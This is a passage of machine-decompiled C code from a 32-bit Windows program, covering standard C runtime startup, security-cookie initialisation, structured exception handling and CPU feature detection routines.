        int32_t v4; // 0x4066aa
        char * v5 = (char *)(v4 - 25); // 0x4066c8
        *v5 = 0;
        int32_t * v6 = (int32_t *)(v4 - 4); // 0x4066cb
        *v6 = 0;
        int32_t v7 = function_4063af(); // 0x4066cf
        int32_t v8 = v4 - 36; // 0x4066d4
        *(char *)v8 = (char)v7;
        if (g157 != 1) {
            char v9; // 0x4066aa
            int32_t result; // 0x406800
            if (g157 != 0) {
                // 0x406734
                *v5 = 1;
                v9 = 1;
            } else {
                // 0x4066eb
                g157 = 1;
                v2 = &g7;
                if (function_40ac95(&g6, &g7) != 0) {
                    // 0x406800
                    *v6 = -2;
                    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                    return result;
                }
                // 0x406717
                v2 = &g5;
                function_40ac39(&g4, &g5);
                g157 = 2;
                v9 = 0;
            }
            int32_t v10 = *(int32_t *)v8; // 0x406739
            v2 = v10;
            function_40654e(v10);
            int32_t v11 = &v1; // 0x406741
            int32_t v12 = function_406e4a(); // 0x406742
            int32_t v13 = v11; // 0x40674d
            if (*(int32_t *)v12 != 0) {
                // 0x40674f
                v2 = v12;
                v13 = v11;
                if ((char)function_4064c4() != 0) {
                    // 0x40675a
                    v2 = 0;
                    int32_t v14 = 0; // bp-20, 0x40675d
                    function_406b3d();
                    v13 = &v14;
                }
            }
            int32_t v15 = function_406e50(); // 0x40676a
            int32_t * v16 = (int32_t *)v15; // 0x406771
            int32_t * v17 = (int32_t *)(v13 - 4);
            if (*v16 != 0) {
                // 0x406775
                *v17 = v15;
                if ((char)function_4064c4() != 0) {
                    // 0x406780
                    *v17 = *v16;
                    function_40a0f8((int32_t)&g266);
                }
            }
            // 0x406788
            *v17 = function_406a5e() & 0xffff;
            *(int32_t *)(v13 - 8) = function_40abe6();
            *(int32_t *)(v13 - 12) = 0;
            int32_t v18 = v13 - 16; // 0x406798
            *(int32_t *)v18 = 0x400000;
            v3 = function_405a30();
            if ((char)function_406a94() == 0) {
                // 0x40680d
                *(int32_t *)(v18 - 4) = v3;
                function_40a130((int32_t)&g266);
                // UNREACHABLE
            }
            if (v9 == 0) {
                // 0x4067b1
                function_40a0d3();
                // UNREACHABLE
            }
            // 0x4067b6
            *(int32_t *)(v13 - 20) = 0;
            *(int32_t *)(v13 - 24) = 1;
            function_40656b((int32_t)&g266, (int32_t)&g266);
            // 0x406800
            *v6 = -2;
            result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
    }
    // 0x406806
    v2 = 7;
    function_406942(7, (int32_t)&g266);
    // 0x40680d
    *(int32_t *)((int32_t)&v2 - 4) = v3;
    function_40a130((int32_t)&g266);
    // UNREACHABLE
}

// Address range: 0x40681c - 0x406826
int32_t entry_point(void) {
    // 0x40681c
    function_406d9a();
    return function_4066aa();
}

// Address range: 0x406826 - 0x406841
int32_t function_406826(int32_t a1) {
    // 0x406826
    int32_t v1; // 0x406826
    int32_t v2; // 0x406826
    function_40688c(a1, v1, v2);
    int32_t result; // 0x406826
    *(int32_t *)result = (int32_t)&g13;
    return result;
}

// Address range: 0x406841 - 0x406859
int32_t function_406841(int32_t a1) {
    // 0x406841
    int32_t result; // 0x406841
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 4) = (int32_t)"bad allocation";
    *(int32_t *)result = (int32_t)&g13;
    return result;
}

// Address range: 0x406859 - 0x406874
int32_t function_406859(int32_t a1) {
    // 0x406859
    int32_t v1; // 0x406859
    int32_t v2; // 0x406859
    function_40688c(a1, v1, v2);
    int32_t result; // 0x406859
    *(int32_t *)result = (int32_t)&g14;
    return result;
}

// Address range: 0x406874 - 0x40688c
int32_t function_406874(int32_t a1) {
    // 0x406874
    int32_t result; // 0x406874
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 4) = (int32_t)"bad array new length";
    *(int32_t *)result = (int32_t)&g14;
    return result;
}

// Address range: 0x40688c - 0x4068b8
int32_t function_40688c(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40688c
    int32_t result; // 0x40688c
    int32_t v1 = result + 4; // 0x406892
    *(int32_t *)result = (int32_t)&g12;
    *(int32_t *)v1 = 0;
    *(int32_t *)(result + 8) = 0;
    int32_t v2; // 0x40688c
    int32_t v3; // 0x40688c
    function_407637(a1 + 4, v1, v2, v3);
    return result;
}

// Address range: 0x4068b8 - 0x4068c9
int32_t function_4068b8(void) {
    // 0x4068b8
    int32_t v1; // 0x4068b8
    *(int32_t *)v1 = (int32_t)&g12;
    return function_40769a(v1 + 4);
}

// Address range: 0x4068c9 - 0x4068f6
int32_t function_4068c9(char a1) {
    // 0x4068c9
    int32_t result; // 0x4068c9
    *(int32_t *)result = (int32_t)&g12;
    function_40769a(result + 4);
    if ((a1 & 1) != 0) {
        // 0x4068e5
        function_4060cb(result);
    }
    // 0x4068ef
    return result;
}

// Address range: 0x4068f6 - 0x406913
int32_t function_4068f6(void) {
    // 0x4068f6
    int32_t v1; // 0x4068f6
    function_406841(v1);
    int32_t v2; // bp-16, 0x4068f6
    function_4076b9(&v2, &g78);
    return __asm_int3();
}

// Address range: 0x406913 - 0x40693d
int32_t function_406913(void) {
    // 0x406913
    int32_t v1; // 0x406913
    function_406874(v1);
    int32_t v2; // bp-16, 0x406913
    function_4076b9(&v2, &g79);
    __asm_int3();
    int32_t v3; // 0x406913
    return v3 != 0 ? v3 : (int32_t)"Unknown exception";
}

// Address range: 0x40693d - 0x406942
int32_t function_40693d(void) {
    // 0x40693d
    return function_40ae11();
}

// Address range: 0x406942 - 0x406a5e
int32_t function_406942(int32_t a1, int32_t a2) {
    // 0x406942
    if (IsProcessorFeaturePresent(23)) {
        // 0x406957
        __asm_int(41);
    }
    // 0x40695c
    function_406b24(3);
    int32_t v1; // bp-808, 0x406942
    function_407730((int32_t)&v1, 0, 716);
    v1 = 0x10001;
    int32_t v2; // bp-92, 0x406942
    int32_t v3 = &v2; // 0x4069fc
    function_407730(v3, 0, 80);
    v2 = 0x40000015;
    IsDebuggerPresent();
    int32_t ExceptionInfo = v3; // bp-12, 0x406a29
    SetUnhandledExceptionFilter(NULL);
    int32_t v4 = UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo); // 0x406a43
    int32_t result = v4; // 0x406a4b
    if (v4 == 0) {
        // 0x406a51
        result = function_406b24(3);
    }
    // 0x406a59
    return result;
}

// Address range: 0x406a5e - 0x406a91
int32_t function_406a5e(void) {
    // 0x406a5e
    int32_t lpStartupInfo; // bp-72, 0x406a5e
    function_407730((int32_t)&lpStartupInfo, 0, 68);
    GetStartupInfoW((struct _STARTUPINFOW *)&lpStartupInfo);
    uint16_t v1; // 0x406a5e
    char v2; // 0x406a5e
    return (v2 & 1) == 0 ? 10 : (int32_t)v1;
}

// Address range: 0x406a91 - 0x406a94
int32_t function_406a91(void) {
    // 0x406a91
    return 0;
}

// Address range: 0x406a94 - 0x406ad7
int32_t function_406a94(void) {
    int32_t * v1 = GetModuleHandleW(NULL); // 0x406a96
    int32_t v2 = (int32_t)v1; // 0x406a96
    if (v1 == NULL || *(int16_t *)v1 != 0x5a4d) {
        // 0x406ad4
        return v2 & -256;
    }
    int32_t v3 = *(int32_t *)(v2 + 60) + v2; // 0x406aad
    if (*(int32_t *)v3 != 0x4550) {
        // 0x406ad4
        return v2 & -256;
    }
    // 0x406ab7
    if (*(int16_t *)(v3 + 24) != 267 || *(int32_t *)(v3 + 116) < 15 || *(int32_t *)(v3 + 232) == 0) {
        // 0x406ad4
        return 256;
    }
    // 0x406ad1
    return 257;
}

// Address range: 0x406ad7 - 0x406ae3
int32_t (*function_406ad7(int32_t (*lpTopLevelExceptionFilter)(struct _EXCEPTION_POINTERS *)))(struct _EXCEPTION_POINTERS *) {
    // 0x406ad7
    return SetUnhandledExceptionFilter(lpTopLevelExceptionFilter);
}

// Address range: 0x406ae3 - 0x406b23
int32_t function_406ae3(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x406ae9
    if (*(int32_t *)v1 != -0x1f928c9d || *(int32_t *)(v1 + 16) != 3) {
        // 0x406b18
        return 0;
    }
    // 0x406af9
    switch (*(int32_t *)(v1 + 20)) {
        case 0x19930522: {
        }
        case 0x19930521: {
        }
        case 0x19930520: {
        }
        case 0x1994000: {
            // 0x406b1e
            function_40ae16();
            // UNREACHABLE
        }
    }
    // 0x406b18
    return 0;
}

// Address range: 0x406b24 - 0x406b2c
int32_t function_406b24(int32_t a1) {
    // 0x406b24
    g160 = 0;
    int32_t result; // 0x406b24
    return result;
}

// Address range: 0x406b2c - 0x406b3d
int32_t function_406b2c(void) {
    // 0x406b2c
    int32_t v1; // 0x406b2c
    if (v1 != g112) {
        // 0x406b37
        return function_406ef9((int32_t)&g266);
    }
    // 0x406b35
    int32_t result; // 0x406b2c
    return result;
}

// Address range: 0x406b3d - 0x406b3e
int32_t function_406b3d(void) {
    // 0x406b3d
    int32_t result; // 0x406b3d
    return result;
}

// Address range: 0x406b3e - 0x406cd7
int32_t function_406b3e(int32_t a1) {
    struct struct1 v1; // 0x406b7f
    struct struct3 v2; // 0x406bba
    // 0x406b3e
    g162 = 0;
    g114 |= 1;
    if (!IsProcessorFeaturePresent(10)) {
        // 0x406cd0
        return 0;
    }
    // 0x406b64
    g114 |= 2;
    g162 = 1;
    v1 = __asm_cpuid(0);
    v2 = __asm_cpuid_3(1);
    int32_t v3; // 0x406b3e
    if ((v1.e1 ^ 0x756e6547 || v1.e2 ^ 0x6c65746e || v1.e3 ^ 0x49656e69) != 0) {
        // 0x406c1a
        v3 = g163;
        goto lab_0x406c20;
    } else {
        int32_t v4 = v2.e0 & 0xfff3ff0; // 0x406bda
        switch (v4) {
            case 0x30660: {
                goto lab_0x406c09;
            }
            case 0x30650: {
                goto lab_0x406c09;
            }
            case 0x20670: {
                goto lab_0x406c09;
            }
            case 0x20660: {
                goto lab_0x406c09;
            }
            case 0x106c0: {
                goto lab_0x406c09;
            }
            default: {
                if (v4 != 0x30670) {
                    // 0x406c1a
                    v3 = g163;
                    goto lab_0x406c20;
                } else {
                    goto lab_0x406c09;
                }
            }
        }
    }
  lab_0x406c20:
    if (v1.e0 >= 7) {
        // 0x406c2c
        if ((__asm_cpuid_4(7).e1 & 512) != 0) {
            // 0x406c53
            g163 = v3 | 2;
        }
    }
    int32_t v5 = v2.e2; // 0x406bba
    if ((v5 & 0x100000) == 0) {
        // 0x406cd0
        return 0;
    }
    // 0x406c6a
    g114 |= 4;
    g162 = 2;
    if ((v5 & 0x18000000) == 0x18000000) {
        // 0x406c89
        __asm_xgetbv(0);
    }
    // 0x406cd0
    return 0;
  lab_0x406c09:;
    int32_t v6 = g163 | 1; // 0x406c0f
    g163 = v6;
    v3 = v6;
    goto lab_0x406c20;
}

// Address range: 0x406cd7 - 0x406cdb
int32_t function_406cd7(void) {
    // 0x406cd7
    return 1;
}

// Address range: 0x406cdb - 0x406ce7
int32_t function_406cdb(int32_t a1) {
    // 0x406cdb
    return g257 != 0;
}

// Address range: 0x406cf0 - 0x406d36
int32_t function_406cf0(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-8, 0x406cf5
    int32_t result = &v1; // 0x406cf5
    int32_t v2 = result - a3; // 0x406d08
    int32_t v3; // 0x406cf0
    *(int32_t *)(v2 - 16) = g112 ^ (int32_t)&v3;
    *(int32_t *)(v2 - 20) = (int32_t)a1;
    __writefsdword(0, result);
    return result;
}

// Address range: 0x406d36 - 0x406d4b
int32_t function_406d36(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x406d36
    int32_t v1; // 0x406d36
    __writefsdword(0, *(int32_t *)(v1 - 16));
    *(int32_t *)v1 = a1;
    int32_t result; // 0x406d36
    return result;
}

// Address range: 0x406d4b - 0x406d9a
int32_t function_406d4b(int32_t a1, int32_t a2) {
    int32_t lpSystemTimeAsFileTime = 0; // bp-16, 0x406d51
    GetSystemTimeAsFileTime((struct _FILETIME *)&lpSystemTimeAsFileTime);
    int32_t v1 = GetCurrentThreadId() ^ lpSystemTimeAsFileTime ^ GetCurrentProcessId();
    int32_t v2 = v1; // bp-8, 0x406d7b
    int32_t lpPerformanceCount; // bp-24, 0x406d4b
    QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount);
    int32_t v3; // 0x406d4b
    return v3 ^ (int32_t)&v2 ^ v1 ^ lpPerformanceCount;
}

// Address range: 0x406d9a - 0x406de5
int32_t function_406d9a(void) {
    int32_t v1 = g112; // 0x406d9a
    if (v1 != -0x44bf19b2 == v1 >= 0x10000) {
        // 0x406dda
        g113 = v1 ^ -1;
        int32_t result; // 0x406d9a
        return result;
    }
    // 0x406db4
    int32_t v2; // 0x406d9a
    int32_t v3; // 0x406d9a
    int32_t v4 = function_406d4b(v2, v3); // 0x406db4
    int32_t result2 = v4; // 0x406dbd
    int32_t v5 = -0x44bf19b1; // 0x406dbd
    if (v4 != -0x44bf19b2) {
        // 0x406dc6
        result2 = v4;
        v5 = v4;
        if (v4 < 0x10000) {
            int32_t v6 = 0x10000 * v4 | 0x47110000; // 0x406dcf
            result2 = v6;
            v5 = v6 | v4;
        }
    }
    // 0x406dd4
    g112 = v5;
    // 0x406dda
    g113 = v5 ^ -1;
    return result2;
}

// Address range: 0x406de5 - 0x406deb
int32_t function_406de5(void) {
    // 0x406de5
    return 0x4000;
}

// Address range: 0x406deb - 0x406df7
void function_406deb(int32_t * ListHead) {
    // 0x406deb
    InitializeSListHead(ListHead);
}

// Address range: 0x406df7 - 0x406dfa
int32_t function_406df7(void) {
    // 0x406df7
    int32_t v1; // 0x406df7
    return v1 & -256 | 1;
}

// Address range: 0x406dfa - 0x406e21
int32_t function_406dfa(void) {
    // 0x406dfa
    int32_t result; // 0x406dfa
    if (result == 0) {
        // 0x406e12
        return result;
    }
    // 0x406e13
    function_406942(0, 0x10000);
    __asm_int3();
    return &g164;
}

// Address range: 0x406e21 - 0x406e3e
int32_t function_406e21(void) {
    int32_t result = function_405790(); // 0x406e21
    int32_t * v1 = (int32_t *)(result + 4); // 0x406e26
    int32_t v2 = *v1; // 0x406e26
    int32_t * v3 = (int32_t *)result; // 0x406e29
    *v3 = *v3 | 4;
    *v1 = v2;
    *v3 = *v3 | 2;
    *v1 = v2;
    return result;
}

// Address range: 0x406e3e - 0x406e4a
int32_t function_406e3e(void) {
    // 0x406e3e
    return g115 == 0;
}

// Address range: 0x406e4a - 0x406e50
int32_t function_406e4a(void) {
    // 0x406e4a
    return &g256;
}

// Address range: 0x406e50 - 0x406e56
int32_t function_406e50(void) {
    // 0x406e50
    return &g255;
}

// Address range: 0x406e56 - 0x406e82
int32_t function_406e56(void) {
    // 0x406e56
    int32_t result; // 0x406e56
    return result;
}

// Address range: 0x406e82 - 0x406eae
int32_t function_406e82(void) {
    // 0x406e82
    int32_t result; // 0x406e82
    return result;
}

// Address range: 0x406eae - 0x406ed1
int32_t function_406eae(char a1) {
    // 0x406eae
    int32_t result; // 0x406eae
    *(int32_t *)result = (int32_t)&g15;
    if ((a1 & 1) != 0) {
        // 0x406ec0
        function_4060cb(result);
    }
    // 0x406eca
    return result;
}

// Address range: 0x406ed1 - 0x406ef9
int32_t function_406ed1(int32_t ExceptionInfo) {
    // 0x406ed1
    SetUnhandledExceptionFilter(NULL);
    UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo);
    return TerminateProcess(GetCurrentProcess(), (int32_t)&g266);
}

// Address range: 0x406ef9 - 0x406ff4
int32_t function_406ef9(int32_t a1) {
    bool v1 = IsProcessorFeaturePresent(23); // 0x406f04
    int32_t v2; // 0x406ef9
    if (v1) {
        // 0x406f0d
        __asm_int(41);
        v2 = 2;
    }
    // 0x406f12
    int32_t v3; // bp-4, 0x406ef9
    int32_t v4 = &v3; // 0x406efa
    char v5 = llvm_ctpop_i8((char)v1); // 0x406f09
    g172 = v1;
    g171 = v2;
    bool v6; // 0x406ef9
    bool v7; // 0x406ef9
    bool v8; // 0x406ef9
    bool v9; // 0x406ef9
    g175 = 0x4000 * (int32_t)v6 | 1024 * (int32_t)v7 | 512 * (int32_t)v8 | 256 * (int32_t)v9 | 128 * (int32_t)v1 | 64 * (int32_t)!v1 | 4 * (int32_t)((v5 & 1) == 0) | 2;
    g173 = v3;
    g174 = a1;
    int32_t v10; // 0x406ef9
    g176 = &v10;
    g170 = 0x10001;
    g167 = a1;
    g165 = -0x3ffffbf7;
    g166 = 1;
    g168 = 1;
    g169 = 2;
    *(int32_t *)(v4 - 8) = g112;
    *(int32_t *)(v4 - 4) = g113;
    return function_406ed1(0x41236c);
}

// Address range: 0x406ff4 - 0x40702b
int32_t function_406ff4(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a1; // bp-12, 0x406fff
    int32_t result; // 0x406ff4
    int32_t v2 = result + 4; // 0x407009
    *(int32_t *)result = (int32_t)&g12;
    *(int32_t *)v2 = 0;
    *(int32_t *)(result + 8) = 0;
    int32_t v3; // 0x406ff4
    function_407637((int32_t)&v1, v2, v3, v1);
    return result;
}

// Address range: 0x40702b - 0x407046
int32_t function_40702b(int32_t a1) {
    // 0x40702b
    int32_t v1; // 0x40702b
    int32_t v2; // 0x40702b
    function_40688c(a1, v1, v2);
    int32_t result; // 0x40702b
    *(int32_t *)result = (int32_t)&g17;
    return result;
}

// Address range: 0x407046 - 0x407067
int32_t function_407046(int32_t a1) {
    // 0x407046
    int32_t v1; // 0x407046
    int32_t v2; // 0x407046
    int32_t result; // 0x407046
    function_406ff4(a1, v1, result, v2);
    *(int32_t *)result = (int32_t)&g17;
    return result;
}

// Address range: 0x407067 - 0x407082
int32_t function_407067(int32_t a1) {
    // 0x407067
    int32_t v1; // 0x407067
    int32_t v2; // 0x407067
    function_40688c(a1, v1, v2);
    int32_t result; // 0x407067
    *(int32_t *)result = (int32_t)&g16;
    return result;
}

// Address range: 0x407082 - 0x407102
int32_t function_407082(char * a1) {
    // 0x407082
    function_407046((int32_t)a1);
    int32_t v1; // bp-16, 0x407082
    function_4076b9(&v1, &g80);
    __asm_int3();
    int32_t v2 = __readfsdword(0); // bp-56, 0x4070d9
    __writefsdword(0, (int32_t)&v2);
    int32_t v3; // 0x407082
    int32_t result = function_4079f0(v1, (int32_t)&g80, v3); // 0x4070ec
    __writefsdword(0, v2);
    return result;
}

// Address range: 0x407102 - 0x4071df
int32_t function_407102(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t result; // 0x407102
    if (a1 != 291) {
        int32_t v1 = __readfsdword(0); // bp-60, 0x40716c
        __writefsdword(0, (int32_t)&v1);
        function_4078e2();
        function_406b3d();
        __writefsdword(0, v1);
        result = 0;
    } else {
        // 0x407112
        *(int32_t *)a2 = 0x4071b1;
        result = 1;
    }
    // 0x4071da
    return result;
}

// Address range: 0x4071df - 0x407256
int32_t function_4071df(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x4071ec
    int32_t v2 = *v1; // 0x4071ec
    int32_t v3 = *(int32_t *)(a1 + 16); // 0x4071f1
    int32_t v4 = v2; // 0x4071f9
    int32_t v5 = v2; // 0x4071f9
    if (a2 < 0) {
      lab_0x407231:;
        uint32_t v6 = v5;
        uint32_t v7 = v4 + 1; // 0x407234
        *a4 = v7;
        *a5 = v6;
        if (!((v7 > v6 | v6 > *v1))) {
            // 0x407245
            return 20 * v7 + v3;
        }
        // 0x407251
        function_40ae16();
        // UNREACHABLE
    }
    int32_t v8 = v2; // 0x407201
    int32_t v9 = 20 * v2 + 8 + v3; // 0x407201
    int32_t v10 = v2; // 0x407201
    int32_t v11 = v2; // 0x407201
    int32_t v12 = a2; // 0x407201
    int32_t v13; // 0x4071df
    int32_t v14; // 0x4071df
    int32_t v15; // 0x4071df
    int32_t v16; // 0x4071df
    while (true) {
      lab_0x407203:
        // 0x407203
        v13 = v10;
        if (v13 == -1) {
            // break -> 0x407251
            break;
        }
        // 0x407208
        v15 = v12;
        v14 = v11;
        int32_t v17 = v9;
        v16 = v8;
        v9 = v17 - 20;
        v10 = v13 - 1;
        if (*(int32_t *)(v17 - 24) < a3) {
            // 0x407217
            if (*(int32_t *)v9 < a3) {
                goto lab_0x407221;
            } else {
                goto lab_0x407226;
            }
        } else {
            goto lab_0x407221;
        }
    }
    // 0x407251
    function_40ae16();
    // UNREACHABLE
  lab_0x407221:
    // 0x407221
    v8 = v16;
    int32_t v18 = v14; // 0x407224
    int32_t v19 = v15; // 0x407224
    if (v13 != 0) {
        goto lab_0x40722d;
    } else {
        goto lab_0x407226;
    }
  lab_0x407226:
    // 0x407226
    v8 = v10;
    v18 = v16;
    v19 = v15 - 1;
    goto lab_0x40722d;
  lab_0x40722d:
    // 0x40722d
    v12 = v19;
    v11 = v18;
    v4 = v10;
    v5 = v11;
    if (v12 < 0) {
        goto lab_0x407231;
    }
    goto lab_0x407203;
}

// Address range: 0x407257 - 0x407282
int32_t function_407257(int32_t result, int32_t a2) {
    // 0x407257
    __writefsdword(0, *(int32_t *)__readfsdword(0));
    return result;
}

// Address range: 0x407282 - 0x407289
int32_t function_407282(int32_t a1) {
    // 0x407282
    int32_t result; // 0x407282
    return result;
}

// Address range: 0x407289 - 0x4072de
int32_t function_407289(int32_t TargetFrame, int32_t ExceptionRecord) {
    int32_t v1 = __readfsdword(0); // 0x407291
    RtlUnwind((int32_t *)TargetFrame, &g1, (struct _EXCEPTION_RECORD *)ExceptionRecord, NULL);
    int32_t * v2 = (int32_t *)(ExceptionRecord + 4); // 0x4072b6
    int32_t result = *v2 & -3; // 0x4072b9
    *v2 = result;
    *(int32_t *)v1 = __readfsdword(0);
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x4072de - 0x40730f
int32_t function_4072de(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4072de
    function_406b2c();
    int32_t v1 = *(int32_t *)(a2 + 12); // 0x4072f6
    int32_t v2 = *(int32_t *)(a2 + 16); // 0x4072fe
    return function_408532(a1, v2, a3, 0, v1, *(int32_t *)(a2 + 20), a2, 0);
}

// Address range: 0x40730f - 0x407333
int32_t function_40730f(int32_t result, int32_t a2) {
    // 0x40730f
    *(int32_t *)result = a2;
    *(int32_t *)(result + 4) = *(int32_t *)(function_4078e2() + 36);
    *(int32_t *)(function_4078e2() + 36) = result;
    return result;
}

// Address range: 0x407333 - 0x407377
int32_t function_407333(int32_t a1) {
    int32_t v1 = *(int32_t *)(function_4078e2() + 36); // 0x40733c
    int32_t result = function_4078e2(); // 0x40733f
    if (v1 == a1) {
        // 0x40734c
        *(int32_t *)(result + 36) = *(int32_t *)(a1 + 4);
        return result;
    }
    int32_t * v2 = (int32_t *)(*(int32_t *)(result + 36) + 4);
    int32_t v3 = *v2; // 0x407363
    while (v3 != 0) {
        // 0x407369
        if (v3 == a1) {
            int32_t result2 = *(int32_t *)(a1 + 4); // 0x40736b
            *v2 = result2;
            return result2;
        }
        v2 = (int32_t *)(v3 + 4);
        v3 = *v2;
    }
    // 0x407372
    function_40ae16();
    // UNREACHABLE
}

// Address range: 0x407378 - 0x40740f
int32_t function_407378(int32_t a1, int32_t a2, int32_t a3) {
    // 0x407378
    function_406b2c();
    if ((*(int32_t *)(a1 + 4) & 102) != 0) {
        // 0x407397
        *(int32_t *)(a2 + 36) = 1;
        return function_407412((int32_t)&g266);
    }
    int32_t v1 = *(int32_t *)(a2 + 24); // 0x4073ad
    int32_t v2 = v1; // bp-20, 0x4073ad
    int32_t v3 = *(int32_t *)(a2 + 12); // 0x4073b9
    int32_t v4 = *(int32_t *)(a2 + 16); // 0x4073c4
    function_408532(a1, v4, a3, 0, v3, *(int32_t *)(a2 + 20), v1, 1);
    int32_t v5; // bp-12, 0x407378
    int32_t * v6 = &v5; // 0x4073d9
    if (*(int32_t *)(a2 + 36) == 0) {
        // 0x4073db
        v2 = a2;
        function_407289(a2, a1);
        v6 = &v2;
    }
    int32_t v7 = (int32_t)v6;
    *(int32_t *)(v7 - 4) = 0;
    *(int32_t *)(v7 - 8) = 0;
    *(int32_t *)(v7 - 12) = 0;
    *(int32_t *)(v7 - 16) = 0;
    *(int32_t *)(v7 - 20) = 0;
    int32_t result; // bp-8, 0x407378
    *(int32_t *)(v7 - 24) = (int32_t)&result;
    *(int32_t *)(v7 - 28) = 291;
    function_407102((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40740f - 0x407412
int32_t function_40740f(void) {
    // 0x40740f
    return 1;
}

// Address range: 0x407412 - 0x407417
int32_t function_407412(int32_t a1) {
    // 0x407412
    int32_t result; // 0x407412
    return result;
}

// Address range: 0x407417 - 0x40744d
int32_t function_407417(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x407417
    int32_t v1; // 0x407417
    return function_408532(a1, a2, a3, a4, v1, 0, 0, 0);
}

// Address range: 0x40744d - 0x407476
int32_t function_40744d(void) {
    // 0x40744d
    function_408a4b();
    function_4089f0();
    int32_t v1 = function_40871a(); // 0x407457
    if ((char)v1 == 0) {
        // 0x407460
        return v1 & -256;
    }
    int32_t v2 = function_407982(); // 0x407463
    if ((char)v2 != 0) {
        // 0x407473
        return v2 & -256 | 1;
    }
    // 0x407460
    return function_408756() & -256;
}

// Address range: 0x407476 - 0x407495
int32_t function_407476(int32_t a1) {
    // 0x407476
    int32_t v1; // 0x407476
    if ((char)a1 == 0) {
        // 0x40747f
        int32_t v2; // 0x407476
        function_4079c6(v2);
        function_408756();
        v1 = function_408a19(0);
    }
    // 0x407491
    return v1 & -256 | 1;
}

// Address range: 0x4074a0 - 0x4074d2
int32_t function_4074a0(int32_t a1, int32_t a2) {
    // 0x4074a0
    if (*(int32_t *)a1 != -2) {
        // 0x4074b2
        function_406b2c();
    }
    // 0x4074bf
    return function_406b2c();
}

// Address range: 0x4074e0 - 0x407637
int32_t function_4074e0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a2 + 16; // 0x4074f3
    int32_t v2 = g112 ^ *(int32_t *)(a2 + 8); // 0x4074f6
    int32_t v3 = v2; // bp-52, 0x4074fd
    function_4074a0(v2, v1);
    function_4086bd(a3);
    int32_t * v4 = (int32_t *)(a2 + 12); // 0x40751e
    int32_t v5 = *v4; // 0x40751e
    int32_t v6; // 0x4074e0
    int32_t v7; // 0x4074e0
    int32_t result; // 0x4074e0
    int32_t v8; // 0x407549
    int32_t v9; // 0x40751b
    if ((*(char *)(a1 + 4) & 102) != 0) {
        // 0x407586
        if (v5 == -2) {
            // 0x4075a9
            return 1;
        }
        // 0x40758b
        v3 = v1;
        function_408bb0(v1, &g112);
        result = 1;
        v7 = &v3;
    } else {
        // 0x407527
        int32_t v10; // bp-44, 0x4074e0
        v9 = &v10;
        int32_t v11 = a1; // bp-32, 0x407527
        *(int32_t *)(a2 - 4) = (int32_t)&v11;
        if (v5 == -2) {
            // 0x4075a9
            return 1;
        }
        v6 = v5;
        int32_t v12 = 4 * (v6 + 4 + 2 * v6) + v2; // 0x407549
        v8 = *(int32_t *)v12;
        char v13 = 0; // 0x407557
        int32_t v14; // 0x40755b
        if (*(int32_t *)(v12 + 4) != 0) {
            // 0x407559
            v14 = function_408b60(v12);
            result = 0;
            v7 = v9;
            if (v14 < 0) {
                goto lab_0x40759d;
            }
            // 0x407569
            v13 = 1;
            if (v14 != 0) {
                // 0x4075b3
                if (*(int32_t *)a1 != -0x1f928c9d) {
                    goto lab_0x4075f6;
                } else {
                    // 0x4075c7
                    if (function_411770(&g30) == 0) {
                        goto lab_0x4075f6;
                    } else {
                        // 0x4075d8
                        v3 = a1;
                        function_406b3d();
                        function_408d2b();
                        goto lab_0x4075f6;
                    }
                }
            }
        }
        char v15 = v13;
        while (v8 != -2) {
            // 0x407540
            v6 = v8;
            v12 = 4 * (v6 + 4 + 2 * v6) + v2;
            v8 = *(int32_t *)v12;
            v13 = v15;
            if (*(int32_t *)(v12 + 4) != 0) {
                // 0x407559
                v14 = function_408b60(v12);
                result = 0;
                v7 = v9;
                if (v14 < 0) {
                    goto lab_0x40759d;
                }
                // 0x407569
                v13 = 1;
                if (v14 != 0) {
                    // 0x4075b3
                    if (*(int32_t *)a1 != -0x1f928c9d) {
                        goto lab_0x4075f6;
                    } else {
                        // 0x4075c7
                        if (function_411770(&g30) == 0) {
                            goto lab_0x4075f6;
                        } else {
                            // 0x4075d8
                            v3 = a1;
                            function_406b3d();
                            function_408d2b();
                            goto lab_0x4075f6;
                        }
                    }
                }
            }
            // 0x407570
            v15 = v13;
        }
        // 0x407577
        result = 1;
        v7 = v9;
        if (v15 == 0) {
            // 0x4075a9
            return 1;
        }
    }
  lab_0x40759d:
    // 0x40759d
    *(int32_t *)(v7 - 4) = v1;
    *(int32_t *)(v7 - 8) = v2;
    function_4074a0((int32_t)&g266, (int32_t)&g266);
    // 0x4075a9
    return result;
  lab_0x4075f6:
    // 0x4075f6
    function_408b94();
    int32_t v16 = v9; // 0x407606
    if (*v4 == v6) {
        goto lab_0x40761a;
    } else {
        // 0x407608
        v3 = v1;
        function_408bb0(v1, &g112);
        v16 = &v3;
        goto lab_0x40761a;
    }
  lab_0x40761a:
    // 0x40761a
    *(int32_t *)(v16 - 4) = v1;
    *(int32_t *)(v16 - 8) = v2;
    *v4 = v8;
    function_4074a0((int32_t)&g266, (int32_t)&g266);
    function_408b78();
    return __asm_int3();
}

// Address range: 0x407637 - 0x40769a
int32_t function_407637(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
